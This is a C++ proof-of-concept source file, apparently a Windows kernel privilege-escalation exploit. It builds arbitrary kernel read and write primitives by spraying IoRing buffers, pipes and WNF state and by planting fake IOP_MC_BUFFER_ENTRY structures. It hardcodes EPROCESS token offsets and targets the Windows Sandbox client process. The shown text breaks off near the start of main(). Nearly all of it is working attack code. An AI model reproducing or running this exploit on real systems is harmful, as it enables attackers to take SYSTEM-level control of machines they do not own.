// poc.cpp : Questo file contiene la funzione 'main', in cui inizia e termina l'esecuzione del programma.
//

#include <iostream>
#include <Windows.h>
#include <combaseapi.h>
#include <iostream>
#include <sstream>
#include "Hexdump.hpp"
#include <ioringapi.h>
#include <tlhelp32.h>
#include <DbgEng.h>
#include <aclapi.h>
#include "wnf.h"
#include <vector>
#include <algorithm>
#include <tuple>

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "Rpcrt4.lib")

#define STATENAMES1_SIZE 0x2000
#define IORINGS_SIZE 0x500
#define SPRAY_PIPE_COUNT 0x500
#define STATENAMES2_SIZE 0x2000
#define STATENAMES3_SIZE 0x800
#define EPROCESS_UNIQUEPROCESSID_OFFSET 0x440
#define EPROCESS_FLINK_OFFSET 0x448
#define EPROCESS_TOKEN_OFFSET 0x4b8
#define SEP_TOKEN_PRIVILEGES_OFFSET 0x40
#define INTEGRITYLEVELINDEX_OFFSET 0xd0
#define NPFS_NPFSDCREATE_OFFSET 0xcfc0
#define NPFS_GOT_ALLOCATEPOOL2_OFFSET 0x7050
#define NT_ALLOCATEPOOL2_OFFSET 0xaaa3b0
#define NT_INITIALSYSTEMPROCESS_OFFSET 0xd1ea60
#define ROOT_PIPE_ATTRIBUTE_OFFSET      0x140
#define FILE_OBJECT_OFFSET              0x30
#define OBJECT_HEADER_SIZE 0x30
#define TARGET_SIZE 0x50
#define REGBUFFERCOUNT (TARGET_SIZE-0x10)/sizeof(PVOID)
#define OBJECT_HEADER_NAMEINFO_SIZE 0x20
#define REGBUFFERS_TAG 0x42527249
#define PIPEATTRIBUTE_TAG 0x7441704e
#define OUTPUT_PIPE_NAME L"\\\\.\\pipe\\IoRingExploitOutput"
#define INPUT_PIPE_NAME L"\\\\.\\pipe\\IoRingExploitInput"
#define WNF_MAX_DATA_SIZE 0x1000
#define ROUND_DOWN(n, align) (((ULONG)n) & ~((align) - 1l))
#define ROUND_UP(n, align) ROUND_DOWN(((ULONG)n) + (align) - 1, (align))

#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

/* Documented in "Windows NT/2000 Native API Reference" by Gary Nebbett. */
typedef struct _SYSTEM_PERFORMANCE_INFORMATION {
    LARGE_INTEGER IdleTime;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
    ULONG ReadOperationCount;
    ULONG WriteOperationCount;
    ULONG OtherOperationCount;
    ULONG AvailablePages;
    ULONG TotalCommittedPages;
    ULONG TotalCommitLimit;
    ULONG PeakCommitment;
    ULONG PageFaults;
    ULONG WriteCopyFaults;
    ULONG TransitionFaults;
    ULONG Reserved1;
    ULONG DemandZeroFaults;
    ULONG PagesRead;
    ULONG PageReadIos;
    ULONG Reserved2[2];
    ULONG PagefilePagesWritten;
    ULONG PagefilePageWriteIos;
    ULONG MappedFilePagesWritten;
    ULONG MappedFilePageWriteIos;
    ULONG PagedPoolUsage;
    ULONG NonPagedPoolUsage;
    ULONG PagedPoolAllocs;
    ULONG PagedPoolFrees;
    ULONG NonPagedPoolAllocs;
    ULONG NonPagedPoolFrees;
    ULONG TotalFreeSystemPtes;
    ULONG SystemCodePage;
    ULONG TotalSystemDriverPages;
    ULONG TotalSystemCodePages;
    ULONG SmallNonPagedLookasideListAllocateHits;
    ULONG SmallPagedLookasideListAllocateHits;
    ULONG Reserved3;
    ULONG MmSystemCachePage;
    ULONG PagedPoolPage;
    ULONG SystemDriverPage;
    ULONG FastReadNoWait;
    ULONG FastReadWait;
    ULONG FastReadResourceMiss;
    ULONG FastReadNotPossible;
    ULONG FastMdlReadNoWait;
    ULONG FastMdlReadWait;
    ULONG FastMdlReadResourceMiss;
    ULONG FastMdlReadNotPossible;
    ULONG MapDataNoWait;
    ULONG MapDataWait;
    ULONG MapDataNoWaitMiss;
    ULONG MapDataWaitMiss;
    ULONG PinMappedDataCount;
    ULONG PinReadNoWait;
    ULONG PinReadWait;
    ULONG PinReadNoWaitMiss;
    ULONG PinReadWaitMiss;
    ULONG CopyReadNoWait;
    ULONG CopyReadWait;
    ULONG CopyReadNoWaitMiss;
    ULONG CopyReadWaitMiss;
    ULONG MdlReadNoWait;
    ULONG MdlReadWait;
    ULONG MdlReadNoWaitMiss;
    ULONG MdlReadWaitMiss;
    ULONG ReadAheadIos;
    ULONG LazyWriteIos;
    ULONG LazyWritePages;
    ULONG DataFlushes;
    ULONG DataPages;
    ULONG ContextSwitches;
    ULONG FirstLevelTbFills;
    ULONG SecondLevelTbFills;
    ULONG SystemCalls;
} SYSTEM_PERFORMANCE_INFORMATION, * PSYSTEM_PERFORMANCE_INFORMATION;
typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI* NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );




typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation = 0,
    ProcessQuotaLimits = 1,
    ProcessIoCounters = 2,
    ProcessVmCounters = 3,
    ProcessTimes = 4,
    ProcessBasePriority = 5,
    ProcessRaisePriority = 6,
    ProcessDebugPort = 7,
    ProcessExceptionPort = 8,
    ProcessAccessToken = 9,
    ProcessLdtInformation = 10,
    ProcessLdtSize = 11,
    ProcessDefaultHardErrorMode = 12,
    ProcessIoPortHandlers = 13,
    ProcessPooledUsageAndLimits = 14,
    ProcessWorkingSetWatch = 15,
    ProcessUserModeIOPL = 16,
    ProcessEnableAlignmentFaultFixup = 17,
    ProcessPriorityClass = 18,
    ProcessWx86Information = 19,
    ProcessHandleCount = 20,
    ProcessAffinityMask = 21,
    ProcessPriorityBoost = 22,
    ProcessDeviceMap = 23,
    ProcessSessionInformation = 24,
    ProcessForegroundInformation = 25,
    ProcessWow64Information = 26,
    ProcessImageFileName = 27,
    ProcessLUIDDeviceMapsEnabled = 28,
    ProcessBreakOnTermination = 29,
    ProcessDebugObjectHandle = 30,
    ProcessDebugFlags = 31,
    ProcessHandleTracing = 32,
    ProcessIoPriority = 33,
    ProcessExecuteFlags = 34,
    ProcessTlsInformation = 35,
    ProcessCookie = 36,
    ProcessImageInformation = 37,
    ProcessCycleTime = 38,
    ProcessPagePriority = 39,
    ProcessInstrumentationCallback = 40,
    ProcessThreadStackAllocation = 41,
    ProcessWorkingSetWatchEx = 42,
    ProcessImageFileNameWin32 = 43,
    ProcessImageFileMapping = 44,
    ProcessAffinityUpdateMode = 45,
    ProcessMemoryAllocationMode = 46,
    ProcessGroupInformation = 47,
    ProcessTokenVirtualizationEnabled = 48,
    ProcessConsoleHostProcess = 49,
    ProcessWindowInformation = 50,
    ProcessHandleInformation = 51,
    ProcessMitigationPolicy = 52,
    ProcessDynamicFunctionTableInformation = 53,
    ProcessHandleCheckingMode = 54,
    ProcessKeepAliveCount = 55,
    ProcessRevokeFileHandles = 56,
    ProcessWorkingSetControl = 57,
    ProcessHandleTable = 58,
    ProcessCheckStackExtentsMode = 59,
    ProcessCommandLineInformation = 60,
    ProcessProtectionInformation = 61,
    ProcessMemoryExhaustion = 62,
    ProcessFaultInformation = 63,
    ProcessTelemetryIdInformation = 64,
    ProcessCommitReleaseInformation = 65,
    ProcessDefaultCpuSetsInformation = 66,
    ProcessAllowedCpuSetsInformation = 67,
    ProcessSubsystemProcess = 68,
    ProcessJobMemoryInformation = 69,
    ProcessInPrivate = 70,
    ProcessRaiseUMExceptionOnInvalidHandleClose = 71,
    ProcessIumChallengeResponse = 72,
    ProcessChildProcessInformation = 73,
    ProcessHighGraphicsPriorityInformation = 74,
    ProcessSubsystemInformation = 75,
    ProcessEnergyValues = 76,
    ProcessPowerThrottlingState = 77,
    ProcessReserved3Information = 78,
    ProcessWin32kSyscallFilterInformation = 79,
    ProcessDisableSystemAllowedCpuSets = 80,
    ProcessWakeInformation = 81,
    ProcessEnergyTrackingState = 82,
    ProcessManageWritesToExecutableMemory = 83,
    ProcessCaptureTrustletLiveDump = 84,
    ProcessTelemetryCoverage = 85,
    ProcessEnclaveInformation = 86,
    ProcessEnableReadWriteVmLogging = 87,
    ProcessUptimeInformation = 88,
    ProcessImageSection = 89,
    ProcessDebugAuthInformation = 90,
    ProcessSystemResourceManagement = 91,
    ProcessSequenceNumber = 92,
    ProcessLoaderDetour = 93,
    ProcessSecurityDomainInformation = 94,
    ProcessCombineSecurityDomainsInformation = 95,
    ProcessEnableLogging = 96,
    ProcessLeapSecondInformation = 97,
    ProcessFiberShadowStackAllocation = 98,
    ProcessFreeFiberShadowStackAllocation = 99,
    ProcessAltSystemCallInformation = 100,
    ProcessDynamicEHContinuationTargets = 101,
    ProcessDynamicEnforcedCetCompatibleRanges = 102,
    ProcessCreateStateChange = 103,
    ProcessApplyStateChange = 104,
    ProcessEnableOptionalXStateFeatures = 105,
    ProcessAltPrefetchParam = 106,
    ProcessAssignCpuPartitions = 107,
    ProcessPriorityClassEx = 108,
    ProcessMembershipInformation = 109,
} PROCESSINFOCLASS;

typedef struct _SEP_TOKEN_PRIVILEGES
{
    ULONGLONG Present;                                                      //0x0
    ULONGLONG Enabled;                                                      //0x8
    ULONGLONG EnabledByDefault;                                             //0x10
}SEP_TOKEN_PRIVILEGES, * PSEP_TOKEN_PRIVILEGES;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

#define SystemHandleInformation 0x10
#define SystemHandleInformationSize 1024 * 1024 * 2

using fNtQuerySystemInformation = NTSTATUS(WINAPI*)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

using myNtFsControlFile = NTSTATUS(WINAPI*)(
    IN HANDLE               FileHandle,
    IN HANDLE               Event OPTIONAL,
    IN PVOID      ApcRoutine OPTIONAL,
    IN PVOID                ApcContext OPTIONAL,
    OUT PVOID    IoStatusBlock,
    IN ULONG                FsControlCode,
    IN PVOID                InputBuffer OPTIONAL,
    IN ULONG                InputBufferLength,
    OUT PVOID               OutputBuffer OPTIONAL,
    IN ULONG                OutputBufferLength);

// handle information
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

// handle table information
typedef struct _SYSTEM_HANDLE_INFORMATION
{
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PSECURITY_DESCRIPTOR           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    BYTE           Reserved1[16];
    PVOID          Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
    BYTE                          Reserved1[2];
    BYTE                          BeingDebugged;
    BYTE                          Reserved2[1];
    PVOID                         Reserved3[2];
    PVOID                         Ldr;
    PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
    PVOID                         Reserved4[3];
    PVOID                         AtlThunkSListPtr;
    PVOID                         Reserved5;
    ULONG                         Reserved6;
    PVOID                         Reserved7;
    ULONG                         Reserved8;
    ULONG                         AtlThunkSListPtr32;
    PVOID                         Reserved9[45];
    BYTE                          Reserved10[96];
    PVOID PostProcessInitRoutine;
    BYTE                          Reserved11[128];
    PVOID                         Reserved12[1];
    ULONG                         SessionId;
} PEB, * PPEB;

typedef LONG       KPRIORITY;

typedef struct _POOL_HEADER
{
    union
    {
        struct
        {
            USHORT PreviousSize : 8;                                          //0x0
            USHORT PoolIndex : 8;                                             //0x0
            USHORT BlockSize : 8;                                             //0x2
            USHORT PoolType : 8;                                              //0x2
        };
        ULONG Ulong1;                                                       //0x0
    };
    ULONG PoolTag;                                                          //0x4
    union
    {
        PVOID ProcessBilled;                                    //0x8
        struct
        {
            USHORT AllocatorBackTraceIndex;                                 //0x8
            USHORT PoolTagHash;                                             //0xa
        };
    };
}POOL_HEADER, * PPOOL_HEADER;

//0x8 bytes (sizeof)
struct _NT_IORING_CREATE_FLAGS
{
    enum _NT_IORING_CREATE_REQUIRED_FLAGS Required;                         //0x0
    enum _NT_IORING_CREATE_ADVISORY_FLAGS Advisory;                         //0x4
};

//0x30 bytes (sizeof)
typedef struct _NT_IORING_INFO
{
    enum IORING_VERSION IoRingVersion;                                      //0x0
    struct _NT_IORING_CREATE_FLAGS Flags;                                   //0x4
    ULONG SubmissionQueueSize;                                              //0xc
    ULONG SubmissionQueueRingMask;                                          //0x10
    ULONG CompletionQueueSize;                                              //0x14
    ULONG CompletionQueueRingMask;                                          //0x18
    PVOID SubmissionQueue;                    //0x20
    PVOID CompletionQueue;                    //0x28
}NT_IORING_INFO, * PNT_IORING_INFO;


typedef struct _KEVENT {
    unsigned char Header[0x18];
} KEVENT, * PKEVENT, * PRKEVENT;

//0x80 bytes (sizeof)
typedef struct _IOP_MC_BUFFER_ENTRY
{
    USHORT Type;                                                            //0x0
    USHORT Reserved;                                                        //0x2
    ULONG Size;                                                             //0x4
    LONG ReferenceCount;                                                    //0x8
    enum _IOP_MC_BUFFER_ENTRY_FLAGS Flags;                                  //0xc
    struct _LIST_ENTRY GlobalDataLink;                                      //0x10
    PVOID Address;                                                          //0x20
    ULONG Length;                                                           //0x28
    CHAR AccessMode;                                                        //0x2c
    LONG MdlRef;                                                            //0x30
    PVOID Mdl;                                                       //0x38
    struct _KEVENT MdlRundownEvent;                                         //0x40
    ULONGLONG* PfnArray;                                                    //0x58
    BYTE dummy[0x20];                               //0x60
}IOP_MC_BUFFER_ENTRY, * PIOP_MC_BUFFER_ENTRY;



typedef struct _UIORING
{
    HANDLE handle;
    NT_IORING_INFO Info;
    UINT32 IoRingKernelAcceptedVersion;
    PVOID RegBufferArray;   // Pointer to array of IORING opperations
    UINT32 BufferArraySize;  // Size of array of opperation pointers
    PVOID Unknown;
    UINT32 FileHandlesCount;
    UINT32 SubQueueHead;
    UINT32 SubQueueTail;
}UIORING, * PUIORING;

typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PPEB PebBaseAddress;
    ULONG_PTR AffinityMask;
    KPRIORITY BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;

using NtCreateCrossVmEvent = NTSTATUS(NTAPI*)(PHANDLE EventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    ULONG Unknown1,
    PVOID Unknown2,
    IN GUID* Guid
    );

using NtQueryInformationProcess = NTSTATUS(WINAPI*)(
    HANDLE           ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID            ProcessInformation,
    ULONG            ProcessInformationLength,
    PULONG           ReturnLength
    );

HANDLE GetWinSBXCliProcHandle() {
    HANDLE hProcess = NULL;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return NULL;
    }
    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return NULL;
    }
    do {
        if (wcscmp(pe32.szExeFile, L"WindowsSandboxClient.exe") == 0) {
            hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));
    CloseHandle(hSnapshot);
    return hProcess;
}

using myNtUpdateWnfStateData =
NTSTATUS(
    NTAPI*)
    (
        _In_ PCWNF_STATE_NAME StateName,
        _In_reads_bytes_opt_(Length) const VOID* Buffer,
        _In_opt_ ULONG Length,
        _In_opt_ PCWNF_TYPE_ID TypeId,
        _In_opt_ const VOID* ExplicitScope,
        _In_ WNF_CHANGE_STAMP MatchingChangeStamp,
        _In_ LOGICAL CheckStamp
        );

using myNtCreateWnfStateName =
NTSTATUS(
    NTAPI*)
    (
        _Out_ PWNF_STATE_NAME StateName,
        _In_ WNF_STATE_NAME_LIFETIME NameLifetime,
        _In_ WNF_DATA_SCOPE DataScope,
        _In_ BOOLEAN PersistData,
        _In_opt_ PCWNF_TYPE_ID TypeId,
        _In_ ULONG MaximumStateSize,
        _In_ PSECURITY_DESCRIPTOR SecurityDescriptor
        );

using myNtDeleteWnfStateName =
NTSTATUS(
    NTAPI*)
    (
        _Out_ PWNF_STATE_NAME StateName
        );

using myNtQueryWnfStateData =
NTSTATUS(
    NTAPI*)(
        _In_ PCWNF_STATE_NAME StateName,
        _In_opt_ PCWNF_TYPE_ID TypeId,
        _In_opt_ const VOID* ExplicitScope,
        _Out_ PWNF_CHANGE_STAMP ChangeStamp,
        _Out_writes_bytes_to_opt_(*BufferSize, *BufferSize) PVOID Buffer,
        _Inout_ PULONG BufferSize
        );


using myNtDeleteWnfStateData =
NTSTATUS(
    NTAPI*)
    (
        _In_ PCWNF_STATE_NAME StateName,
        _In_opt_ const VOID* ExplicitScope
        );


typedef struct _WNF_STATE_CORRUPTED {
    WNF_STATE_NAME state;
    unsigned long long val;
    ULONG dataSize;
} WNF_STATE_CORRUPTED, * PWNF_STATE_CORRUPTED;

typedef struct _TEMP_ARRAY_ELEMENT {
    PISID  Sid;
    ULONG SidLength;
} TEMP_ARRAY_ELEMENT;


typedef struct _SPRAY_PIPE {
    HANDLE pipe_read;
    HANDLE pipe_write;
}SPRAY_PIPE, * PSPRAY_PIPE;

PUIORING puioring = NULL;
PVOID ioringaddress = NULL;
HIORING targetHandle = NULL;
IOP_MC_BUFFER_ENTRY* fake_bufferentry = NULL;
UINT_PTR userData = 0x41414141;
ULONG numberOfFakeBuffers = 100;
PVOID addressForFakeBuffers = NULL;
HANDLE inputPipe = INVALID_HANDLE_VALUE;
HANDLE outputPipe = INVALID_HANDLE_VALUE;
HANDLE inputClientPipe = INVALID_HANDLE_VALUE;
HANDLE outputClientPipe = INVALID_HANDLE_VALUE;
IORING_BUFFER_INFO preregBuffers[REGBUFFERCOUNT] = { 0 };
PUIORING* iorings = NULL;
SPRAY_PIPE* spray_pipes = NULL;
SIZE_T attribute_size = TARGET_SIZE - 0x38;
unsigned char* attribute = NULL;
unsigned char* output = NULL;
SIZE_T output_size = 0x100;

BOOL prepare() {
    iorings = new PUIORING[IORINGS_SIZE];
    HRESULT result;
    IORING_CREATE_FLAGS flags;
    spray_pipes = new SPRAY_PIPE[SPRAY_PIPE_COUNT];

    for (int i = 0; i < SPRAY_PIPE_COUNT; i++) {
        if (!CreatePipe(&spray_pipes[i].pipe_read, &spray_pipes[i].pipe_write, NULL, NULL)) {
            std::cout << "CreatePipe failed with error " << GetLastError() << "  index " << i << std::endl;
        }
    }

    attribute = new unsigned char[0x1000];
    memset(attribute, 0x41, 0x1000);
    attribute[0] = 'Z';
    attribute[1] = '\0';
    output = new unsigned char[output_size];
    memset(output, 0x0, 0x100);

    flags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;
    flags.Advisory = IORING_CREATE_ADVISORY_FLAGS_NONE;

    fake_bufferentry = reinterpret_cast<IOP_MC_BUFFER_ENTRY*>(VirtualAlloc(NULL, 0x5000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));
    VirtualLock(fake_bufferentry, 0x5000);
    fake_bufferentry = reinterpret_cast<IOP_MC_BUFFER_ENTRY*>(reinterpret_cast<unsigned char*>(fake_bufferentry) + 0x3000);
    memset(fake_bufferentry, 0, sizeof(IOP_MC_BUFFER_ENTRY));
    //pre-register buffer array with len=REGBUFFERCOUNT
    preregBuffers[0].Address = VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!preregBuffers[0].Address)
    {
        printf("[-] Failed to allocate prereg buffer\n");
        return FALSE;
    }
    memset(preregBuffers[0].Address, 0x41, 0x100);
    preregBuffers[0].Length = 0x10;

    for (int i = 0; i < IORINGS_SIZE; i++) {
        result = CreateIoRing(IORING_VERSION_3, flags, 0x10000, 0x20000, reinterpret_cast<HIORING*>(&(iorings[i])));
        if (!SUCCEEDED(result))
        {
            printf("[-] Failed creating IO ring handle: 0x%x\n", result);
        }
        //printf("[+] Created IoRing. puioring=0x%p\n", iorings[i]);

        result = BuildIoRingRegisterBuffers(reinterpret_cast<HIORING>(iorings[i]), REGBUFFERCOUNT, preregBuffers, 0);
        if (!SUCCEEDED(result))
        {
            printf("[-] Failed BuildIoRingRegisterBuffers: 0x%x\n", result);
        }
    }

    // Create named pipes for the input/output of the I/O operations
    // and open client handles for them
    //
    inputPipe = CreateNamedPipe(INPUT_PIPE_NAME, PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
    if (inputPipe == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to create input pipe: 0x%x\n", GetLastError());
        return FALSE;
    }
    outputPipe = CreateNamedPipe(OUTPUT_PIPE_NAME, PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
    if (outputPipe == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to create output pipe: 0x%x\n", GetLastError());
        return FALSE;
    }

    outputClientPipe = CreateFile(OUTPUT_PIPE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (outputClientPipe == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open handle to output file: 0x%x\n", GetLastError());
        return FALSE;
    }

    inputClientPipe = CreateFile(INPUT_PIPE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (inputClientPipe == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open handle to input pipe: 0x%x\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL KWrite(PVOID TargetAddress, PBYTE pValue, SIZE_T size) {

    DWORD bytesWritten = 0;
    HRESULT result;
    UINT32 submittedEntries;
    IORING_CQE cqe;

    //printf("[*] Writing to %p the following bytes\n", TargetAddress);
    //printf("[*] pValue = 0x%p\n", pValue);
    //printf("[*] data: ");
    //for (int i = 0; i < size; i++) {
    //    printf("0x%x ", pValue[i]);
    //}
    //printf("\n");
    if (WriteFile(inputPipe, pValue, size, &bytesWritten, NULL) == FALSE)
    {
        result = GetLastError();
        printf("[-] Failed to write into the input pipe: 0x%x\n", result);
        return FALSE;
    }
    //printf("[*] bytesWritten = %d\n", bytesWritten);
    //
    // Setup another buffer entry, with the address of ioring->RegBuffers as the target
    // Use the client's handle of the input pipe for the read operation
    //
    memset(fake_bufferentry, 0, sizeof(IOP_MC_BUFFER_ENTRY));
    fake_bufferentry->Address = TargetAddress;
    fake_bufferentry->Length = size;
    fake_bufferentry->Type = 0xc02;
    fake_bufferentry->Size = 0x80;
    fake_bufferentry->AccessMode = 1;
    fake_bufferentry->ReferenceCount = 1;

    auto requestDataBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
    auto requestDataFile = IoRingHandleRefFromHandle(inputClientPipe);

    //printf("[*] performing buildIoRingReadFile\n");
    result = BuildIoRingReadFile(targetHandle,
        requestDataFile,
        requestDataBuffer,
        size,
        0,
        NULL,
        IOSQE_FLAGS_NONE);
    if (!SUCCEEDED(result))
    {
        printf("[-] Failed building IO ring read file structure: 0x%x\n", result);
        return FALSE;
    }

    result = SubmitIoRing(targetHandle, 1, INFINITE, &submittedEntries);
    if (!SUCCEEDED(result))
    {
        printf("[-] Failed submitting IO ring: 0x%x\n", result);
        return FALSE;
    }
    //printf("[*] submittedEntries = %d\n", submittedEntries);
    return TRUE;
}

BOOL KRead(PVOID TargetAddress, PBYTE pOut, SIZE_T size) {
    DWORD bytesRead = 0;
    HRESULT result;
    UINT32 submittedEntries;
    IORING_CQE cqe;

    memset(fake_bufferentry, 0, sizeof(IOP_MC_BUFFER_ENTRY));
    fake_bufferentry->Address = TargetAddress;
    fake_bufferentry->Length = size;
    fake_bufferentry->Type = 0xc02;
    fake_bufferentry->Size = 0x80;
    fake_bufferentry->AccessMode = 1;
    fake_bufferentry->ReferenceCount = 1;

    auto requestDataBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
    auto requestDataFile = IoRingHandleRefFromHandle(outputClientPipe);

    result = BuildIoRingWriteFile(targetHandle,
        requestDataFile,
        requestDataBuffer,
        size,
        0,
        FILE_WRITE_FLAGS_NONE,
        NULL,
        IOSQE_FLAGS_NONE);
    if (!SUCCEEDED(result))
    {
        printf("[-] Failed building IO ring read file structure: 0x%x\n", result);
        return FALSE;
    }

    result = SubmitIoRing(targetHandle, 1, INFINITE, &submittedEntries);
    if (!SUCCEEDED(result))
    {
        printf("[-] Failed submitting IO ring: 0x%x\n", result);
        return FALSE;
    }
    //printf("[*] submittedEntries = %d\n", submittedEntries);
    //
    // Check the completion queue for the actual status code for the operation
    //
    result = PopIoRingCompletion(targetHandle, &cqe);
    if ((!SUCCEEDED(result)) || (!NT_SUCCESS(cqe.ResultCode)))
    {
        printf("[-] Failed reading kernel memory 0x%x\n", cqe.ResultCode);
        return FALSE;
    }

    BOOL res = ReadFile(outputPipe,
        pOut,
        size,
        &bytesRead,
        NULL);
    if (!res)
    {
        printf("[-] Failed to read from output pipe: 0x%x\n", GetLastError());
        return FALSE;
    }
    //printf("[+] Successfully read %d bytes from kernel address 0x%p.\n", bytesRead, TargetAddress);
    return res;
}

int main()
{
    //printf("creating event\n");

    //////getchar();

    HANDLE hEvent;
    GUID guid, guid2;
    ULONG ReturnLength = 0;
    LPOLESTR guidstr = (LPOLESTR)new char[0x100];
    LPOLESTR guidstr2 = (LPOLESTR)new char[0x100];
    STARTUPINFOA si;
    unsigned char* status[0x30] = { 0 };
    PROCESS_INFORMATION pi;
    DWORD64 out = 0;
    DWORD64 fileObject = 0;
    DWORD64 driverObject = 0;
    DWORD64 deviceObject = 0;
    POOL_HEADER* ph = NULL;
    DWORD64 pNpFsdCreate = 0;
    DWORD64* data = NULL;
    unsigned char* ptr3 = NULL;
    DWORD64 pExAllocatePool2 = 0;
    DWORD64 system_eproc = 0;
    DWORD64 system_token = 0;
    DWORD64 cur_eproc = 0;
    HANDLE hWinsbxclientproc;
    PROCESS_BASIC_INFORMATION pbi;
    long long offset = 0;
    PEB peb;
    PRTL_USER_PROCESS_PARAMETERS processParams = reinterpret_cast<PRTL_USER_PROCESS_PARAMETERS>(new char[0x1000]);
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags |= STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Hide the window
    OBJECT_ATTRIBUTES oa = { 0 };
    unsigned long cnt = 0;
    SECURITY_DESCRIPTOR sd = { 0 };
    SECURITY_DESCRIPTOR sd_spraying = { 0 };
    SECURITY_DESCRIPTOR* psd;
    ULONG stamp = 0;
    WNF_STATE_CORRUPTED* regBuffersControllerWNF = NULL;
    PACL pdacl;
    ACCESS_ALLOWED_ACE* newace = reinterpret_cast<ACCESS_ALLOWED_ACE*>(VirtualAlloc(NULL, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    ACCESS_ALLOWED_ACE* ace;
    ACCESS_ALLOWED_ACE* other_ace;
    myNtCreateWnfStateName fNtCreateWnfStateName = (myNtCreateWnfStateName)GetProcAddress(GetModuleHandleA("NTDLL.dll"), "NtCreateWnfStateName");
    myNtDeleteWnfStateName fNtDeleteWnfStateName = (myNtDeleteWnfStateName)GetProcAddress(GetModuleHandleA("NTDLL.dll"), "NtDeleteWnfStateName");
    myNtUpdateWnfStateData fNtUpdateWnfStateData = (myNtUpdateWnfStateData)GetProcAddress(GetModuleHandleA("NTDLL.dll"), "NtUpdateWnfStateData");
    myNtDeleteWnfStateData fNtDeleteWnfStateData = (myNtDeleteWnfStateData)GetProcAddress(GetModuleHandleA("NTDLL.dll"), "NtDeleteWnfStateData");
    myNtQueryWnfStateData fNtQueryWnfStateData = (myNtQueryWnfStateData)GetProcAddress(GetModuleHandleA("NTDLL.dll"), "NtQueryWnfStateData");
    myNtFsControlFile fNtFsControlFile = (myNtFsControlFile)GetProcAddress(GetModuleHandleA("NTDLL.dll"), "NtFsControlFile");
    NtQuerySystemInformation_t NtQuerySystemInformation =
        (NtQuerySystemInformation_t)GetProcAddress(GetModuleHandleA("NTDLL.dll"), "NtQuerySystemInformation");
    NTSTATUS result = -1;
